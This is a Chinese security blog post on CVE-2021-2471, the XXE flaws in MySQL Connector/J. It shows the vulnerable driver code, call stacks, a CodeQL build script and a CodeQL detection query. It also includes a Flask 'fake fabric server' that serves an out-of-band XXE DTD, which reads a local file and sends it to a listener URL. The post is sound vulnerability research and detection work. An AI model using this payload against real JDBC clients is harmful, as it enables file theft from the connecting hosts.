    <content type="html"><![CDATA[<p>pyn3rd师傅的《Make JDBC Attack Brilliant Again》中有一个0day是mysql jdbc xxe，thread3am师傅也早就复现出来了，而且还发现了h2的xxe。膜一个，师傅们都太🐂🍺了。很多师傅们也复现了，再讲也没啥意思了，用CodeQL整点新的吧。</p><ol><li><p>CVE-2021-2471 mysql jdbc xxe在HITB ppt里面，没有讲DOMSource XXE这一部分，原因应该是pyn3rd师傅提漏洞还未公开，没写在ppt里面。所以这个洞有两个东西：</p><p> a. DOMSource XXE, 影响所有版本，官方8.0.27中修复掉了</p><p> b. Fabric XXE, 影响5.x, 在5.1.49中修复</p></li><li><p>CodeQL CWE-611有XXE的检测poc，不过source源不支持mysql。</p></li></ol><h2 id="CVE-2021-2471"><a href="#CVE-2021-2471" class="headerlink" title="CVE-2021-2471"></a>CVE-2021-2471</h2><h3 id="DOMSource-XXE"><a href="#DOMSource-XXE" class="headerlink" title="DOMSource XXE"></a>DOMSource XXE</h3><p>漏洞代码在 com.mysql.cj.jdbc.MysqlSQLXML#getSource</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Source&gt; <span class="function">T <span class="title">getSource</span><span class="params">(Class&lt;T&gt; clazz)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    checkClosed();</span><br><span class="line">    checkWorkingWithResult();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note that we try and use streams here wherever possible for the day that the server actually supports streaming from server -&gt; client</span></span><br><span class="line">    <span class="comment">// (futureproofing)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span> || clazz.equals(SAXSource.class)) &#123;</span><br><span class="line"></span><br><span class="line">        InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">            inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T) <span class="keyword">new</span> SAXSource(inputSource);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(DOMSource.class)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">            builderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">            DocumentBuilder builder = builderFactory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">            InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">                inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (T) <span class="keyword">new</span> DOMSource(builder.parse(inputSource));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            SQLException sqlEx = SQLError.createSQLException(t.getMessage(), MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, t, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(StreamSource.class)) &#123;</span><br><span class="line">        Reader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">            reader = <span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T) <span class="keyword">new</span> StreamSource(reader);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(StAXSource.class)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Reader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">                reader = <span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                reader = <span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (T) <span class="keyword">new</span> StAXSource(<span class="keyword">this</span>.inputFactory.createXMLStreamReader(reader));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XMLStreamException ex) &#123;</span><br><span class="line">            SQLException sqlEx = SQLError.createSQLException(ex.getMessage(), MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, ex, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="string">&quot;MysqlSQLXML.2&quot;</span>, <span class="keyword">new</span> Object[] &#123; clazz.toString() &#125;),</span><br><span class="line">                MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的XXE了（StAXSource不能利用）</p><p>POC用thread3am是否的，见参考【5】</p><p>调用栈如下，也比较简单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse:327, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">getSource:225, MysqlSQLXML (com.mysql.cj.jdbc)</span><br><span class="line">main:33, OracleJDBC (com.m0d9.sec.jdbc.mssql)</span><br></pre></td></tr></table></figure><h3 id="Fabric-XXE"><a href="#Fabric-XXE" class="headerlink" title="Fabric XXE"></a>Fabric XXE</h3><p>漏洞触发代码在 com.mysql.fabric.xmlrpc.Client#execute</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> MethodResponse <span class="title">execute</span><span class="params">(MethodCall methodCall)</span> <span class="keyword">throws</span> IOException, ParserConfigurationException, SAXException, MySQLFabricException </span>&#123;</span><br><span class="line">    HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      connection = (HttpURLConnection)<span class="keyword">this</span>.url.openConnection();</span><br><span class="line">      connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">      connection.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;MySQL XML-RPC&quot;</span>);</span><br><span class="line">      connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">      connection.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">      connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">      connection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : <span class="keyword">this</span>.headers.entrySet()) &#123;</span><br><span class="line">        connection.setRequestProperty((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      String out = methodCall.toString();</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      OutputStream os = connection.getOutputStream();</span><br><span class="line">      os.write(out.getBytes());</span><br><span class="line">      os.flush();</span><br><span class="line">      os.close();</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      InputStream is = connection.getInputStream();</span><br><span class="line">      SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      ResponseParser saxp = <span class="keyword">new</span> ResponseParser();</span><br><span class="line">      </span><br><span class="line">      parser.parse(is, saxp);</span><br><span class="line">      </span><br><span class="line">      is.close();</span><br><span class="line">      </span><br><span class="line">      MethodResponse resp = saxp.getMethodResponse();</span><br><span class="line">      <span class="keyword">if</span> (resp.getFault() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MySQLFabricException(resp.getFault());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>原理逻辑pyn3rd 师傅PPT给出来了，fake mysql fabric server 代码也给出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/xxe.dtd&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxe_oob</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;!ENTITY % aaaa SYSTEM &quot;fiLe:///tmp/data&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % demo &quot;&lt;!ENTITY bbbb SYSTEM</span></span><br><span class="line"><span class="string">&#x27;http://127,0.0.1:5000/xxe?data=%aaaa;&#x27;&gt;&quot;&gt; %demo;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dtd</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % xd SYSTEM &quot;http://127.0.0.1:5000/xxe.dtd&quot;&gt; %xd;]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;bbbb;&lt;/root&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">execute:91, Client (com.mysql.fabric.xmlrpc)</span><br><span class="line">call:113, InternalXmlRpcMethodCaller (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">errorSafeCallMethod:151, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">getServerGroups:200, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">getServerGroups:220, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">refreshState:71, FabricConnection (com.mysql.fabric)</span><br><span class="line">&lt;init&gt;:46, FabricConnection (com.mysql.fabric)</span><br><span class="line">&lt;init&gt;:203, FabricMySQLConnectionProxy (com.mysql.fabric.jdbc)</span><br><span class="line">&lt;init&gt;:93, JDBC4FabricMySQLConnectionProxy (com.mysql.fabric.jdbc)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:488, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:425, Util (com.mysql.jdbc)</span><br><span class="line">connect:78, FabricMySQLDriver (com.mysql.fabric.jdbc)</span><br><span class="line">getConnection:677, DriverManager (java.sql)</span><br><span class="line">getConnection:251, DriverManager (java.sql)</span><br></pre></td></tr></table></figure><h2 id="CodeQL-with-Mysql-XXE"><a href="#CodeQL-with-Mysql-XXE" class="headerlink" title="CodeQL with Mysql XXE"></a>CodeQL with Mysql XXE</h2><p>5.*的需要安装jdk5，比较麻烦，这里以8.0.26为例</p><h3 id="Build-Mysql-QL-DB"><a href="#Build-Mysql-QL-DB" class="headerlink" title="Build Mysql QL DB"></a>Build Mysql QL DB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># download mysql-connector-j</span></span><br><span class="line">wget https://github.com/mysql/mysql-connector-j/archive/refs/tags/8.0.25.tar.gz -O mysql-connector-j-8.0.25.tar.gz</span><br><span class="line">tar -xzvf mysql-connector-j-8.0.25.tar.gz &amp;&amp; <span class="built_in">cd</span> mysql-connector-j-8.0.25</span><br><span class="line"></span><br><span class="line">mkdir lib &amp;&amp; <span class="built_in">cd</span> lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># download ant build libs</span></span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/jupiter/junit-jupiter-api/5.6.2/junit-jupiter-api-5.6.2.jar -O junit-jupiter-api-5.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/jupiter/junit-jupiter-engine/5.6.2/junit-jupiter-engine-5.6.2.jar -O junit-jupiter-engine-5.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-commons/1.6.2/junit-platform-commons-1.6.2.jar -O junit-platform-commons-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-engine/1.6.2/junit-platform-engine-1.6.2.jar -O junit-platform-engine-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-launcher/1.6.2/junit-platform-launcher-1.6.2.jar -O junit-platform-launcher-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/apiguardian/apiguardian-api/1.1.0/apiguardian-api-1.1.0.jar -O apiguardian-api-1.1.0.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/opentest4j/opentest4j/1.2.0/opentest4j-1.2.0.jar -O opentest4j-1.2.0.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/javassist/javassist/3.27.0-GA/javassist-3.27.0-GA.jar -O javassist-3.27.0-GA.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=com/google/protobuf/protobuf-java/3.11.4/protobuf-java-3.11.4.jar -O protobuf-java-3.11.4.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=com/mchange/c3p0/0.9.5.5/c3p0-0.9.5.5.jar -O c3p0-0.9.5.5.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/slf4j/slf4j-api/1.7.30/slf4j-api-1.7.30.jar -O slf4j-api-1.7.30.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/hamcrest/hamcrest/2.2/hamcrest-2.2.jar -O hamcrest-2.2.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># build.properties</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cat &lt;&lt; EOF &gt; build.properties</span><br><span class="line">com.mysql.cj.build.jdk=<span class="variable">$JAVA_HOME</span></span><br><span class="line">com.mysql.cj.extra.libs=./lib</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># codeql build</span></span><br><span class="line">codeql database create mysql-qldb -l java --<span class="built_in">command</span>=<span class="string">&quot;ant dist&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Run-QL-Search"><a href="#Run-QL-Search" class="headerlink" title="Run QL Search"></a>Run QL Search</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@name</span> MySQL JDBC XXE</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> mysql jdbc xxe.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@problem</span>.severity error</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@precision</span> high</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@id</span> java/xxe</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@tags</span> security</span></span><br><span class="line"><span class="comment"> *       external/cwe/cwe-611</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.security.XmlParsers</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.TaintTracking2</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.frameworks.Jdbc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MySQLJdbcSource</span> <span class="keyword">extends</span> <span class="title">RemoteFlowSource</span> </span>&#123;</span><br><span class="line">  MySQLJdbcSource()&#123;</span><br><span class="line">    exists(MethodAccess m | m = <span class="keyword">this</span>.asExpr() |</span><br><span class="line">      (m.getMethod().getDeclaringType*().hasQualifiedName(<span class="string">&quot;com.mysql.cj.protocol.a&quot;</span>, <span class="string">&quot;SimplePacketReader&quot;</span>)</span><br><span class="line">        and (m.getMethod().hasName(<span class="string">&quot;readMessage&quot;</span>) or m.getMethod().hasName(<span class="string">&quot;readHeader&quot;</span>))</span><br><span class="line">      )</span><br><span class="line">      or </span><br><span class="line">      (m.getMethod().getDeclaringType*().hasQualifiedName(<span class="string">&quot;com.mysql.cj.jdbc.result&quot;</span>, <span class="string">&quot;ResultSetImpl&quot;</span>) </span><br><span class="line">        and (m.getMethod().getName().substring(<span class="number">0</span>, <span class="number">3</span>) = <span class="string">&quot;get&quot;</span>)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function">override string <span class="title">getSourceType</span><span class="params">()</span> </span>&#123; result = <span class="string">&quot;jdbc&quot;</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">class SafeSAXSourceFlowConfig extends TaintTracking2::Configuration &#123;</span><br><span class="line">  SafeSAXSourceFlowConfig() &#123; <span class="keyword">this</span> = <span class="string">&quot;XmlParsers::SafeSAXSourceFlowConfig&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node src)</span> </span>&#123; src.asExpr() <span class="keyword">instanceof</span> SafeSAXSource &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123;</span><br><span class="line">    sink.asExpr() = any(XmlParserCall parse).getSink()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override <span class="keyword">int</span> <span class="title">fieldFlowBranchLimit</span><span class="params">()</span> </span>&#123; result = <span class="number">0</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UnsafeXxeSink extends DataFlow::ExprNode &#123;</span><br><span class="line">  UnsafeXxeSink() &#123;</span><br><span class="line">    <span class="function">not <span class="title">exists</span><span class="params">(SafeSAXSourceFlowConfig safeSource | safeSource.hasFlowTo(<span class="keyword">this</span>)</span>) and</span></span><br><span class="line"><span class="function">    <span class="title">exists</span><span class="params">(XmlParserCall parse |</span></span></span><br><span class="line"><span class="function"><span class="params">      parse.getSink()</span> </span>= <span class="keyword">this</span>.getExpr() and</span><br><span class="line">      not parse.isSafe()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XxeConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  XxeConfig() &#123; <span class="keyword">this</span> = <span class="string">&quot;XXE.ql::XxeConfig&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node src)</span> </span>&#123; src <span class="keyword">instanceof</span> RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123; sink <span class="keyword">instanceof</span> UnsafeXxeSink &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::PathNode source, DataFlow::PathNode sink, XxeConfig conf</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">&quot;Unsafe parsing of XML file from $@.&quot;</span>, source.getNode(),</span><br><span class="line">  <span class="string">&quot;user input&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-181.png" alt="upload successful"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Postgresql很早就有XXE CVE，横向思维是个好东西，可惜还是不够不能主动发现😭</p><p>CodeQL是个好东西，在构建调用图的基础上，有一套解释型语言来进行搜索，比neo4j要方便很多。值得深入学习，本篇算是记录CodeQL学习的入门篇，期待。。。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://paper.seebug.org/1324/">使用 CodeQL 分析闭源 Java 程序</a></li><li>[2] <a href="https://github.com/github/codeql/issues/4304">can codeql analyse java rt.jar source code? #4304</a></li><li>[3] <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-installing-source.html">SQL Connector/J 8.0 Developer Guide  /  Connector/J Installation  /  Installing from Source</a></li><li>[4] <a href="https://codeql.github.com/codeql-query-help/java/">CodeQL query help for Java</a></li><li>[5] <a href="https://github.com/SecCoder-Security-Lab/jdbc-sqlxml-xxe">SecCoder-Security-Lab/jdbc-sqlxml-xxe </a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;pyn3rd师傅的《Make JDBC Attack Brilliant Again》中有一个0day是mysql jdbc xxe，thread3am师傅也早就复现出来了，而且还发现了h2的xxe。膜一个，师傅们都太🐂🍺了。很多师傅们也复现了，再讲也没啥意思了，用CodeQL整点新的吧。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;CVE-2021-2471 mysql jdbc xxe在HITB ppt里面，没有讲DOMSource XXE这一部分，原因应该是pyn3rd师傅提漏洞还未公开，没写在ppt里面。所以这个洞有两个东西：&lt;/p&gt;
&lt;p&gt; a. DOMSource XXE, 影响所有版本，官方8.0.27中修复掉了&lt;/p&gt;
&lt;p&gt; b. Fabric XXE, 影响5.x, 在5.1.49中修复&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CodeQL CWE-611有XXE的检测poc，不过source源不支持mysql。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
